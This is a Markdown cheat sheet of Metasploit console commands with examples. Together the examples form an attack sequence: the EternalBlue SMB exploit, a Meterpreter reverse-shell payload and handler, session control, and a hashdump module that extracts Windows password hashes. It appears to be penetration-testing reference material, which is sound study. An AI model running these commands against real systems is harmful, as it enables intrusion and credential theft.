# Metasploit Framework Commands

| **Purpose**                               | **Command Syntax**                           |
|-------------------------------------------|----------------------------------------------|
| Start Metasploit Console                  | `msfconsole`                                 |
| Search for an exploit or auxiliary module | `search <keyword>`                           |
| Use a specific module                     | `use <module_path>`                          |
| Show available payloads                   | `show payloads`                              |
| Set a specific payload                    | `set payload <payload_name>`                 |
| Set a target option                       | `set <option> <value>`                       |
| Show available targets for the module     | `show targets`                               |
| Exploit the target                        | `exploit`                                    |
| Show current settings                     | `show options`                               |
| Save the current configuration            | `save`                                       |
| Exit the console                          | `exit`                                       |
| Update Metasploit Framework               | `msfupdate`                                  |
| Check if a target is vulnerable           | `check`                                      |
| Launch a multi-handler for a reverse shell| `use exploit/multi/handler`                  |
| Set the LHOST for the payload             | `set LHOST <IP_address>`                     |
| Set the LPORT for the payload             | `set LPORT <port_number>`                    |
| View all active sessions                  | `sessions -l`                                |
| Interact with a specific session          | `sessions -i <session_id>`                   |
| Background a session                      | `background`                                 |
| Run a post-exploitation module            | `run <module_path>`                          |

## Example Commands

### Start Metasploit Console
```sh
cd C:\metasploit-framework\bin
msfconsole
```

### Search for an Exploit or Auxiliary Module
```sh
search exploit/windows/smb/ms17_010_eternalblue
```

### Use a Specific Module
```sh
use exploit/windows/smb/ms17_010_eternalblue
```

### Show Available Payloads
```sh
show payloads
```

### Set a Specific Payload
```sh
set payload windows/x64/meterpreter/reverse_tcp
```

### Set a Target Option
```sh
set RHOSTS 192.168.1.100
```

### Show Available Targets for the Module
```sh
show targets
```

### Exploit the Target
```sh
exploit
```

### Show Current Settings
```sh
show options
```

### Save the Current Configuration
```sh
save
```

### Exit the Console
```sh
exit
```

### Update Metasploit Framework
```sh
msfupdate
```

### Check if a Target is Vulnerable
```sh
check
```

### Launch a Multi-Handler for a Reverse Shell
```sh
use exploit/multi/handler
```

### Set the LHOST for the Payload
```sh
set LHOST 192.168.1.100
```

### Set the LPORT for the Payload
```sh
set LPORT 4444
```

### View All Active Sessions
```sh
sessions -l
```

### Interact with a Specific Session
```sh
sessions -i 1
```

### Background a Session
```sh
background
```

### Run a Post-Exploitation Module
```sh
run post/windows/gather/hashdump
```
```